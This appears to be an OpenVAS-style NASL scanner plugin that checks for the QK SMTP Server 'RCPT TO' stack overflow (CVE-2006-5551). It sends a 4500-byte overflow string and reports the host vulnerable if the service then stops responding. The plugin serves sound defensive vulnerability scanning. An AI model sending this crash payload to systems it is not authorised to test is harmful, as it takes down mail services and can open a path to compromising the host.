# SPDX-FileCopyrightText: 2008 Ferdy Riphagen
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.2000201");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-5551");
  script_name("QK SMTP Server 'RCPT TO' buffer overflow vulnerability");
  script_category(ACT_DENIAL);
  script_family("Gain a shell remotely");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("smtpserver_detect.nasl", "smtp_settings.nasl");
  script_require_ports("Services/smtp", 25);
  script_mandatory_keys("smtp/qk_smtp/detected");

  script_xref(name:"URL", value:"http://www.securiteam.com/exploits/6P00O15H6U.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/20681");

  script_tag(name:"solution", value:"Upgrade to QK SMTP Server 3.1 beta or a newer release.");

  script_tag(name:"summary", value:"QK SMTP Server is installed on the remote host which is prone
  to a stack based overflow.");

  script_tag(name:"insight", value:"The application does not properly check it's boundaries for
  user supplied input in the 'RCPT TO' field.");

  script_tag(name:"impact", value:"This results in a stack based overflow, where it's possible to
  crash the service or compromise the host.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = smtp_get_port(default:25);
soc = open_sock_tcp(port);
if(!soc)
  exit(0);

banner = smtp_recv_banner(socket:soc);
if(!banner || "QK SMTP Server" >!< banner)
  exit(0);

# This works regardless of the results from smtp_settings.nasl.
domain = get_3rdparty_domain();
sender = get_kb_item("SMTP/headers/From");
helo = string("EHLO ", domain, "\r\n");
from = string("MAIL FROM: ", sender, "\r\n");
bof = string("RCPT TO: ", crap(data:raw_string(0x41), length:4500), "@", domain, "\r\n");

send(socket:soc, data:helo);
recv = recv(socket:soc, length:1024);
if(!recv || "250-Hello" >!< recv) {
  smtp_close(socket:soc, check_data:recv);
  exit(0);
}

send(socket:soc, data:from);
recv = recv(socket:soc, length:1024);
if(!recv || "Address Okay" >!< recv) {
  smtp_close(socket:soc, check_data:recv);
  exit(0);
}

send(socket:soc, data:bof);
recv = recv(socket:soc, length:1024);
if(recv)
  smtp_close(socket:soc, check_data:recv);

soc = open_sock_tcp(port);
if(soc)
  line = smtp_recv_line(socket:soc, code:"220");

if(!soc || !strlen(line)) {
  security_message(port:port);
  exit(0);
}

if(soc)
  smtp_close(socket:soc, check_data:line);

exit(99);
